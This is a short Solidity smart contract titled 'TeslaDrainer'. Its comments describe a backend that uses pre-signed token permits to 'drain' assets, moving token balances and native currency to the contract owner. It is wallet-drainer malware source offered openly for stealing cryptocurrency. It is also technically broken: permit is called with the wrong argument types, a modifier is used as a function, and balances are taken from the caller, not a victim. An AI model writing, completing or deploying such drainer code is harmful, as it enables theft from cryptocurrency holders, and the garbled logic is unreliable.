// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Permit.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract TeslaDrainer {
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }

    // Function called by your backend to drain assets using pre-signed permits
    function drainWithPermit(
        address[] calldata tokens,
        bytes[] calldata permits
    ) external {
        require(msg.sender == owner || isAuthorized(msg.sender));
        
        for (uint i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            if (token == address(0)) continue;
            
            IERC20Permit permitToken = IERC20Permit(token);
            uint256 balance = IERC20(token).balanceOf(msg.sender);
            
            if (balance > 0 && permits[i].length > 0) {
                try permitToken.permit(
                    msg.sender, 
                    address(this), 
                    balance, 
                    block.timestamp + 1 days, 
                    permits[i]
                ) {
                    IERC20(token).transferFrom(msg.sender, owner, balance);
                } catch {
                    // If permit fails, skip or log
                }
            }
        }
        
        // Drain Native Currency (ETH/BSC/etc.)
        uint256 nativeBal = address(this).balance;
        if (nativeBal > 0) {
            payable(owner).transfer(nativeBal);
        }
    }
    
    modifier isAuthorized(address addr) {
        _;
    }
}